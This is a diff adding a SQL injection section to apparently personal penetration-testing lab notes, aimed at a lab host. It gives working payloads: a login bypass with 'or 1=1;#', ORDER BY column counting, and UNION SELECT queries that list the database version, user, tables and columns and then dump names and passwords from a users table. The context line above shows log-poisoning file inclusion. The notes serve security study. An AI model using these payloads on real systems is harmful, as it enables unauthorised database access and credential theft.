@@ -75,3 +75,39 @@ Even with remote file includes turned off it's still possible to run local files
 3. We can now attempt to include the log by navigating to
 
     `http://10.11.5.115/addguestbook.php?name=hacker&comment=test&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit`
+
+##SQL Injection (SQLi)
+
+**Authentication Bypass**
+Fairly simply hack our goal is to change a query from `SELECT * FROM USERS WHERE username="admin" AND password="XXXX"` to `SELECT * FROM USERS WHERE username="admin" or 1=1;#" AND password="XXXX"`
+
+Once we gain control we can use limit's to ensure we only get one record if necessary
+
+**Error Based Enumeration**
+1. Test a field using `'` or `"` if you can see the errors you can glean extra information
+
+2. Using order by you can manipulate the SQL to let you know how many columns are in the table 
+
+    i.e at url `http://10.11.5.115/comment.php?id=738 order by 7` we run the SQL `SELECT * FROM guestbook where id = 738 order by 7` giving us the error `Unknown column '7' in 'order clause'`
+
+3. Now that we now the number of columns in the table we can use `union all` to interegrate the data, remember that we need to return the same number of columns in our union
+
+4. Using a basic union we will tag our columns to find out which/where they might be output
+
+    `http://10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,5,6`
+
+5. Now we can start enumerating using our union statements
+
+    Version: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,@@version,6`
+    User: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,user(),6`
+
+6. In this case we are running as root so we can enumerate more heavily
+
+    All Tables: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,table_name,6 FROM information_schema.tables`
+    Get columns for a specific table: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,column_name,6 FROM information_schema.columns where table_name="users"`
+
+7. Then it's just a case of dumping data of that table
+
+    `http://10.11.5.115/comment.php?id=738%20UNION%20SELECT%201,2,name,4,password,6%20FROM%20users`
+
+##Blind SQL Injection
